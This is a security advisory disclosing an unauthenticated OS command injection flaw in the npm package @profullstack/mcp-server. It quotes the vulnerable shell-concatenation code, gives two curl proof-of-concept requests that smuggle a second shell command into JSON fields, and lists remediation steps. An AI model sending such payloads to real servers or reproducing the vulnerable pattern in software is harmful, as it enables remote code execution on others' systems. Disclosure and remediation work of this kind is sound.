# [C] @profullstack/mcp-server vulnerable to OS Command Injection in domain_lookup Module

## Summary
Severity: Critical
Advisory: GHSA-v6wj-c83f-v46x
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-09
Source: https://github.com/advisories/GHSA-v6wj-c83f-v46x
Type: github-advisory

## Affected
- npm: `@profullstack/mcp-server` — affected >=0

## Details
<html>
<body>
<!--StartFragment--><html><head></head><body><h1>Security Advisory: OS Command Injection in <code>profullstack/mcp-server</code> <code>domain_lookup</code> Module</h1>

Field | Value
-- | --
Project | profullstack/mcp-server
Repository | https://github.com/profullstack/mcp-server
Affected Commit | 2e8ea913573610667ad54e31dba2e8198ebf7cf9
Affected Module | mcp_modules/domain_lookup
Affected Endpoints | POST /domain-lookup/check, POST /domain-lookup/bulk
Vulnerability Type | CWE-78: OS Command Injection
CVSS 3.1 Score | 9.8 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Authentication Required | None
Default Network Exposure | Bind address 0.0.0.0, no global authentication middleware
Validated | 2026-04-21 (initial), 2026-04-28 (re-confirmed)


<hr>
<h2>Summary</h2>
<p>The <code>domain_lookup</code> module assembles a shell command string by concatenating user-controlled input (<code>domains</code> / <code>keywords</code>) and passes it to <code>execAsync()</code>. Both HTTP endpoints reach the same sink. Because there is no argument quoting, escaping, or allowlist — and no authentication on the server — an unauthenticated remote attacker can execute arbitrary OS commands as the server process.</p>
<hr>
<h2>Affected Code</h2>
<ul>
<li><code>index.js:27</code> — server binds to <code>0.0.0.0</code>, no global auth middleware.</li>
<li><code>mcp_modules/domain_lookup/index.js:52</code> — registers <code>POST /domain-lookup/check</code>.</li>
<li><code>mcp_modules/domain_lookup/index.js:55</code> — registers <code>POST /domain-lookup/bulk</code>.</li>
<li><code>mcp_modules/domain_lookup/src/service.js:19, :20</code> — <code>buildTldxCommand()</code> concatenates user input into the shell string.</li>
<li><code>mcp_modules/domain_lookup/src/service.js:114, :115, :142</code> — <code>execAsync(command)</code> sink reached from both routes.</li>
</ul>
<hr>
<h2>Vulnerable Code</h2>
<p><strong>File:</strong> <code>mcp_modules/domain_lookup/src/service.js</code></p>
<p><strong>Step 1 — User input concatenated directly into a shell string:</strong></p>
<pre><code class="language-js">buildTldxCommand(keywords, options = {}) {
  let command = `tldx ${keywords.join(' ')}`;

  if (options.prefixes?.length) {
    command += ` --prefixes ${options.prefixes.join(',')}`;
  }
}
</code></pre>
<p><strong>Step 2 — That shell string is executed as-is:</strong></p>
<pre><code class="language-js">async checkDomainAvailability(domains, options = {}) {
  try {
    const command = this.buildTldxCommand(domains, options);
    const { stdout, stderr } = await execAsync(command);
</code></pre>
<p>There is no sanitization between Step 1 and Step 2. Shell metacharacters (<code>;</code>, <code>|</code>, <code>$()</code>, etc.) in user input are interpreted by <code>/bin/sh</code> at execution time.</p>
<hr>
<h2>Proof of Concept</h2>
<p>Tested against a local Docker build of the affected commit (<code>0.0.0.0:13000-&gt;3000/tcp</code>).</p>
<h3>PoC A — <code>POST /domain-lookup/check</code></h3>
<p><strong>Request:</strong></p>
<pre><code class="language-bash">curl -X POST http://localhost:13000/domain-lookup/check \
  -H 'Content-Type: application/json' \
  -d '{"domains":["example.com; echo final_check_poc &gt; /tmp/verify-exports/final_check.txt; #"]}'
</code></pre>
<p><strong>Response:</strong></p>
<pre><code>HTTP/1.1 500 Internal Server Error
access-control-allow-origin: *
content-type: application/json
Date: Tue, 21 Apr 2026 04:32:39 GMT

{"error":"tldx command failed: tldx command failed: /bin/sh: tldx: not found\n"}
</code></pre>
<p><strong>Side effect confirmed inside container:</strong></p>
<pre><code>$ cat /tmp/verify-exports/final_check.txt
final_check_poc
</code></pre>
<h3>PoC B — <code>POST /domain-lookup/bulk</code></h3>
<p><strong>Request:</strong></p>
<pre><code class="language-bash">curl -X POST http://localhost:13000/domain-lookup/bulk \
  -H 'Content-Type: application/json' \
  -d '{"keywords":["safe","x; echo final_bulk_poc &gt; /tmp/verify-exports/final_bulk.txt; #"]}'
</code></pre>
<p><strong>Response:</strong></p>
<pre><code>HTTP/1.1 500 Internal Server Error
access-control-allow-origin: *
content-type: application/json
Date: Tue, 21 Apr 2026 04:32:40 GMT

{"error":"Bulk domain check failed: Bulk domain check failed: /bin/sh: tldx: not found\n"}
</code></pre>
<p><strong>Side effect confirmed inside container:</strong></p>
<pre><code>$ cat /tmp/verify-exports/final_bulk.txt
final_bulk_poc
</code></pre>
<h3>Note on HTTP 500</h3>
<p>Both requests return HTTP 500 because <code>tldx</code> is not installed in the test container. The injected commands are interpreted by the shell <strong>before</strong> <code>tldx</code> is invoked. The marker files confirm that attacker-controlled commands executed successfully despite the 500 response. In a production environment where <code>tldx</code> is installed, both the intended function and the injected commands execute.</p>
<hr>
<h2>Impact</h2>
<ul>
<li>Unauthenticated remote code execution as the server process UID.</li>
<li>Full read/write access to any file the server process can access.</li>
<li>Potential for outbound connections, credential theft, persistence, and lateral movement.</li>
<li>Reproducible with a single unauthenticated HTTP POST to either of two documented endpoints.</li>
</ul>
<hr>
<h2>Suggested Remediation</h2>
<ol>
<li>Replace <code>execAsync(command)</code> with <code>child_process.execFile</code> or <code>spawn('tldx', [keyword1, keyword2, ...])</code> — pass arguments as an array, never as a concatenated shell string.</li>
<li>Validate all domain/keyword input against a strict allowlist (RFC 1035 hostname syntax) before invoking the external binary; reject any input containing shell metacharacters.</li>
<li>Add a global authentication middleware so all HTTP-exposed modules are not callable anonymously.</li>
<li>Default the server bind address to <code>127.0.0.1</code> and require explicit opt-in for non-loopback bindings.</li>
</ol>
<hr>
<h2>Verification Environment</h2>
<ul>
<li>Local Docker container only; no third-party deployment was tested.</li>
<li>The container does not include the <code>tldx</code> binary; this is intentional for safe local PoC and does not affect exploitability.</li>
</ul></body></html><!--EndFragment-->
</body>
</html>

## References
- https://github.com/profullstack/mcp-server/security/advisories/GHSA-v6wj-c83f-v46x
- https://github.com/profullstack/mcp-server
